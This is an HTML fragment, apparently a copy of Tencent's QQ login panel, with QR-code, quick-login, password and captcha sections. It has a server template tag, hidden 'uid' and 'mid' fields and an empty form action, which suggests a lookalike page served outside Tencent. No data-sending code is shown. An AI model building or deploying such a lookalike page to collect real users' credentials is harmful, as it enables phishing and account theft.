 <body>
     <script src="//cdn.bootcss.com/jquery/3.0.0-rc1/jquery.min.js"  type="text/javascript"></script>
  <div class="login" id="login">
   <div class="header">
    <a class="close" id="close" href="javascript:void(0);" title="关闭" tabindex="14"></a>
   </div>
   <div class="qrlogin" id="qrlogin">
    <label class="qr_title">安全登录，防止被盗</label>
    <div class="qr_img_box" id="qr_img_box">
     <img id="qr_img" class="qr_img" src="/images/qr_code.png"/>
     <span id="qr_img_logo" class="qr_img_logo"></span>
     <span id="qr_invalid" class="qr_invalid"><span id="qr_mengban" class="qr_mengban"></span> <span id="qr_invalid_tips" class="qr_invalid_tips">二维码失效<br />请点击刷新</span></span>
    </div>
    <div class="qr_info">
     <a class="qr_info_link" id="qr_info_link" href="#" tabindex="13">使用QQ手机版扫描二维码</a>
    </div>
    <div class="split_line"></div>
   </div>
   <div class="other_login" id="other_login">
    <div id="loginTips" class="loginTips">
     <span class="qloginTips" id="qloginTips" href="javascript:void(0);">点击头像快速登录</span>
     <span class="ploginTips" id="ploginTips" href="javascript:void(0);">帐号登录</span>
     <div class="error_tips" id="error_tips">
      <span class="error_logo" id="error_logo"></span>
      <span class="err_m" id="err_m"></span>
     </div>
     <div class="loading_tips" id="loading_tips">
      <span id="loading_wording">登录中</span>
      <img id="loading_img" class="loading_img" place_src="http://imgcache.qq.com/ptlogin/v4/style/0/images/load.gif" align="absmiddle" />
     </div>
    </div>
    <div class="qlogin" id="qlogin">
     <a title="上一页" class="prePage" id="prePage" href="javascript:void(0);"><span class="preRow" tabindex="6"></span></a>
     <div class="qlogin_show" id="qlogin_show">
      <div class="qlogin_list" id="qlogin_list"></div>
     </div>
     <a title="下一页" class="nextPage" id="nextPage" href="javascript:void(0);"><span class="nextRow" tabindex="7"></span></a>
    </div>
    <div class="plogin" id="plogin">
     <div class="login_form">
      <form id="loginform" autocomplete="off" name="loginform" action="" method="post" target="_self" style="margin:0">
       <div class="uinArea" id="uinArea">
        <label class="input_tips" id="uin_tips" for="u">支持QQ号/邮箱/手机号登录</label>
        <div class="inputOuter">
         <input type="text" class="inputstyle" id="u" name="u" value="" tabindex="1" />
         <span class="uin_icon"></span>
         <a class="uin_del" id="uin_del" href="javascript:void(0);"></a>
        </div>
        <ul class="email_list" id="email_list"></ul>
       </div>
       <div class="pwdArea" id="pwdArea">
        <label class="input_tips" id="pwd_tips" for="p">密码</label>
        <input type="hidden" name="uid" value="">
        <input type="hidden" name="mid" value="">
        <input type="hidden" name="tz" value="<%=tz%>">
        <div class="inputOuter">
         <input type="password" class="inputstyle password" id="p" name="p" value="" maxlength="16" tabindex="2" />
         <span class="p_icon"></span>
        </div>
        <div class="lock_tips" id="caps_lock_tips">
         <span class="lock_tips_row"></span>
         <span>大写锁定已打开</span>
        </div>
       </div>
       <div class="verifyArea" id="verifyArea">
        <div class="verifyinputArea" id="verifyinputArea">
         <label class="input_tips" id="vc_tips" for="verifycode">验证码</label>
         <div class="inputOuter">
          <input name="verifycode" type="text" class="inputstyle verifycode" id="verifycode" value="" tabindex="3" />
         </div>
        </div>
        <div class="verifyimgArea" id="verifyimgArea">
         <img class="verifyimg" id="verifyimg" title="看不清，换一张" />
         <a tabindex="4" href="javascript:void(0);" class="verifyimg_tips">看不清，换一张</a>
        </div>
       </div>
       <div class="submit">
        <a class="login_button" hidefocus="true" href="javascript:void(0);">
            <input type="button" tabindex="6" value="登 录" class="btn" id="login_buctton"/>
        </a>
       </div>
      </form>
     </div>
    </div>
    <div class="login_switcher_box" id="login_switcher_box">
     <a hidefocus="true" id="switcher_qlogin" class="switcher_qlogin" href="javascript:void(0);" tabindex="7">&lt;&lt;&nbsp;返回快速登录</a>
     <a hidefocus="true" id="switcher_plogin" class="switcher_plogin" href="javascript:void(0);" tabindex="8">使用帐号密码登录</a>
    </div>
   </div>
   <div id="qrlogin_step2" class="qrlogin_step2">
    <div class="step2_outer">
     <div class="qr_h3">
      扫描成功，请在手机上确认是否授权登录
     </div>
     <div class="goBack">
      使用其它方式登录，请
      <a id="goBack" href="javascript:void(0);" tabindex="14">返回</a>
     </div>
    </div>
   </div>
   <div id="qr_tips" class="qr_tips">
    <div class="qr_tips_menban" id="qr_tips_menban"></div>
    <div class="qr_tips_pic" id="qr_tips_pic"></div>
   </div>
   <div class="bottom" id="bottom">
    <span id="fgtpwdbox"><a href="#" class="link" id="forgetpwd" tabindex="10">忘了密码？</a> <span class="dotted">|</span></span>
    <a href="#" class="link" tabindex="11">注册新帐号</a>
    <span class="dotted">|</span>
    <a class="link" id="feedback_qlogin" href="#" tabindex="12">意见反馈</a>
